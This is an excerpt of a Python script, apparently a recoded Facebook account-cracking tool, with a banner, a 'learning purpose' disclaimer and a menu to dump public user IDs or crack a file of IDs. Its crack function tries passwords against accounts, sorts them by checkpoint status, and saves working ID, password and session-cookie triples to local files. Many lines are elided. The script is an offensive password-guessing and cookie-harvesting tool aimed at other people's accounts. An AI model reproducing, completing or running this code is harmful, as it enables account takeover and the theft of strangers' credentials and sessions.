...
⠀⠀⠀⠀⠀          ⠀⠀⠀⠈⠙⠛⠶⠶⠦⠤⠤⠤⠶⠶⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀
  {m}•{k}•{h}•{sir} THIS TOOL IS ONLY FOR LEARNING PURPOSE {x}{m}•{k}•{h}•{x}
    ...
    \t{asu}    {m}•{k}•{h}•{sir} RECODE : ALIYAN  {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def menu(my_name,my_id):
	...
	aliyanafridi(f'Your Ip  :{b}{ip}{x}')
	print('')
	print('1. Public ')
	print('2. Crack File ')
	print('E. Exit')
	_____cowok__ALIYAN_____ = input('\nEnter  : ')
	if _____cowok__ALIYAN_____ in ['1']:
		dump_massal()
	elif _____cowok__ALIYAN_____ in ['2']:
		crack_file()
	elif _____cowok__ALIYAN_____ in ['E']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}Aliyan-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}ALIYAN-CP😴>> {idf}|{pw}{N}')
				...
				print(f'\r{H}ALIYAN-OK😘>> {idf}|{pw}{h}{x}') 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'ALIYAN-CP😴[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='ALIYANAFRIDI-XD CP'))
					open('/sdcard/ALIYANAFRIDI-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/ALIYANAFRIDI-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'ALIYAN-OK😘[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='ALIYANAFRIDI-XD OK'))
					ok+=1
					break
					...
					hit=0
					infoakun += (f"\n[bold yellow]ALIYAN-CP😰[•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					...
					print('\n')
					statusok = f'[bold green]ALIYAN-OK😘[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]ALIYANAFRIDI-XD OK[/bold green]'))
					ok+=1
					break
